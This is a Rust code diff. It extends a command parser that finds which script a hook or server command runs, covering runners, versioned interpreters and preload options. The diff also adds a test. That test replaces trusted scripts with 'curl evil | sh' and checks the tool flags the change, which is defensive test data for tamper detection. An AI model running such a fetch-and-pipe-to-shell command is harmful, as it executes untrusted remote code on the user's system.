@@ -1090,19 +1090,26 @@ enum Position {
     Program,
     /// After an interpreter, where the script it runs comes, past options.
     Script,
+    /// After an interpreter's option that takes a value, which is not code.
+    Value,
+    /// After an interpreter's option that loads a module first, which is.
+    Module,
     /// After what the command runs: its arguments.
     Arguments,
 }
 
 impl Position {
     /// Whether `word`, standing here, is what its command runs, and where
-    /// the word after it stands.
+    /// the word after it stands. Programs are known by their names whatever
+    /// directory they are run from, and an interpreter by its version too:
+    /// `/usr/bin/env`, `python3.11`.
     fn read(self, word: &str) -> (bool, Self) {
         const KEYWORDS: [&str; 13] = [
             "if", "then", "else", "elif", "do", "while", "until", "!", "{", "time", "fi", "done",
             "}",
         ];
-        const WRAPPERS: [&str; 11] = [
+        // Programs that run the program after them, a runner's among them.
+        const WRAPPERS: [&str; 21] = [
             "env",
             "exec",
             "nohup",
@@ -1114,26 +1121,67 @@ impl Position {
             "nice",
             "stdbuf",
             "caffeinate",
+            "uv",
+            "uvx",
+            "npx",
+            "bunx",
+            "pnpm",
+            "yarn",
+            "poetry",
+            "pipx",
+            "pdm",
+            "hatch",
         ];
+        // A runner's or a runtime's word for running what follows it.
+        const SUBCOMMANDS: [&str; 5] = ["run", "exec", "x", "dlx", "--"];
         const INTERPRETERS: [&str; 19] = [
             "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python3", "node", "nodejs",
             "deno", "bun", "ruby", "perl", "php", "lua", "tsx", "source", ".",
         ];
+        // An interpreter's options whose value is a word of its own.
+        const VALUED: [&str; 5] = ["-W", "-X", "-o", "-O", "-m"];
+        // A runtime's options whose value is code it loads before the script.
+        const LOADS: [&str; 5] = [
+            "-r",
+            "--require",
+            "--import",
+            "--loader",
+            "--experimental-loader",
+        ];
+
+        let name = word.rsplit('/').next().unwrap_or(word);
+        let interpreter = INTERPRETERS.contains(&name)
+            || INTERPRETERS
+                .contains(&name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'));
         let assignment = word.split_once('=').is_some_and(|(name, _)| {
             !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
         });
+        // A wrapper's figure — `timeout 10`, `timeout 10s`, `nice -n 5`.
+        let figure = word
+            .trim_end_matches(['s', 'm', 'h', 'd'])
+            .parse::<f64>()
+            .is_ok();
         match self {
-            Self::Program if assignment || KEYWORDS.contains(&word) || WRAPPERS.contains(&word) => {
+            Self::Program
+                if assignment
+                    || figure
+                    || word.starts_with('-')
+                    || KEYWORDS.contains(&word)
+                    || WRAPPERS.contains(&name)
+                    || SUBCOMMANDS.contains(&word) =>
+            {
                 (false, Self::Program)
             }
-            // A wrapper's options and figures: `timeout 10`, `nice -n 5`.
-            Self::Program if word.starts_with('-') || word.parse::<f64>().is_ok() => {
-                (false, Self::Program)
-            }
-            Self::Program if INTERPRETERS.contains(&word) => (false, Self::Script),
+            Self::Program if interpreter => (false, Self::Script),
             Self::Program => (true, Self::Arguments),
-            Self::Script if word.starts_with('-') => (false, Self::Script),
+            Self::Script if VALUED.contains(&word) => (false, Self::Value),
+            Self::Script if LOADS.contains(&word) => (false, Self::Module),
+            Self::Script if word.starts_with('-') || SUBCOMMANDS.contains(&word) => {
+                (false, Self::Script)
+            }
             Self::Script => (true, Self::Arguments),
+            Self::Value => (false, Self::Script),
+            Self::Module => (true, Self::Script),
             Self::Arguments => (false, Self::Arguments),
         }
     }
@@ -2620,6 +2668,52 @@ mod tests {
 
         assert!(started.elapsed() < std::time::Duration::from_secs(10));
         assert!(record_trust(&clone.record, &untrusted).is_err());
+    }
+
+    /// The plain ways a hook or a server runs a script: an interpreter by
+    /// its path or version, a runner's subcommand, a wrapper's duration, an
+    /// interpreter's option and its value, a module a runtime loads first.
+    #[test]
+    fn a_script_run_through_a_runner_or_an_interpreter_by_path_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        let commands = [
+            "/bin/bash a.sh",
+            "/usr/bin/env bash b.sh",
+            "timeout 10s bash c.sh",
+            "uv run d.py",
+            "deno run --allow-read e.ts",
+            "npx -y tsx f.ts",
+            "poetry run python g.py",
+            "python3.11 -W ignore h.py",
+            "bash -o pipefail i.sh",
+            "node --require ./j.js k.js",
+        ];
+        let hooks: Vec<String> = commands
+            .iter()
+            .map(|command| format!(r#"{{"type":"command","command":"{command}"}}"#))
+            .collect();
+        clone.write(
+            "claude.json",
+            &format!(
+                r#"{{"hooks":{{"Stop":[{{"hooks":[{}]}}]}},"mcpServers":{{"m":{{"command":"uv","args":["run","l.py"]}}}}}}"#,
+                hooks.join(",")
+            ),
+        );
+        let scripts = [
+            "a.sh", "b.sh", "c.sh", "d.py", "e.ts", "f.ts", "g.py", "h.py", "i.sh", "j.js", "k.js",
+            "l.py",
+        ];
+        for script in scripts {
+            clone.write(script, "one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in scripts {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
     }
 
     /// A file a hook only reads or mentions is not code it runs: a manifest
